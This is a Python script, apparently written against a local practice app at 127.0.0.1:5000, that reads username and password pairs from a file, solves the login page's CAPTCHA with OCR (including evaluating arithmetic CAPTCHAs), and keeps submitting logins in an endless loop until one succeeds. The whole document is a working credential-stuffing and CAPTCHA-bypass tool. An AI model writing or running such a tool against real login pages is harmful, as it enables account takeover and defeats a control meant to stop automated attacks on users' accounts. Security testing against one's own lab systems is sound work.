import time
from PIL import Image
import pytesseract
from selenium import webdriver
from selenium.webdriver.common.by import By
import cv2
import re
import easyocr
reader = easyocr.Reader(['en'])
# Set path to Tesseract (adjust for your setup)
pytesseract.pytesseract.tesseract_cmd = r"C:\Program Files\Tesseract-OCR\tesseract.exe"

# Preprocess image to improve OCR accuracy
def preprocess_image(image_path):
    img = cv2.imread(image_path)
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    gray = cv2.resize(gray, None, fx=2, fy=2, interpolation=cv2.INTER_LINEAR)  # upscale
    blurred = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blurred, 150, 255, cv2.THRESH_BINARY_INV)
    processed_path = "processed.png"
    cv2.imwrite(processed_path, thresh)
    return processed_path



def solve_captcha_with_easyocr(image_path):
    result = reader.readtext(image_path, detail=0)
    text = ''.join(result).upper()
    print(f"[EasyOCR Detected] {text}")

    match = re.search(r'(\d+)\s*([\+\-\*/])\s*(\d+)', text)
    if match:
        a, op, b = match.groups()
        try:
            return str(eval(f"{a}{op}{b}"))
        except:
            pass

    cleaned = re.sub(r'[^A-Z0-9]', '', text)
    return cleaned


# Load credentials
with open("credentials.txt") as f:
    credentials = [line.strip().split() for line in f if line.strip()]

# Setup browser
driver = webdriver.Chrome()
driver.get("http://127.0.0.1:5000/")
time.sleep(1)

# Keep running until login is successful
success = False
attempts = 0

while not success:
    for username, password in credentials:
        attempts += 1
        print(f"\n🔁 Attempt #{attempts} → Trying {username}:{password}")

        driver.get("http://127.0.0.1:5000/")
        time.sleep(1)

        captcha_img = driver.find_element(By.TAG_NAME, "img")
        captcha_img.screenshot("captcha.png")

        captcha_text = solve_captcha_with_easyocr("captcha.png")

        driver.find_element(By.NAME, "username").clear()
        driver.find_element(By.NAME, "username").send_keys(username)

        driver.find_element(By.NAME, "password").clear()
        driver.find_element(By.NAME, "password").send_keys(password)

        driver.find_element(By.NAME, "captcha").clear()
        driver.find_element(By.NAME, "captcha").send_keys(captcha_text)

        driver.find_element(By.TAG_NAME, "button").click()
        time.sleep(1)

        if "✅ Logged in" in driver.page_source:
            print(f"\n🎉 SUCCESS! Logged in with {username}:{password} after {attempts} attempts.")
            success = True
            break
        else:
            print(f"❌ Failed for {username}:{password} with CAPTCHA = {captcha_text}")

driver.quit()
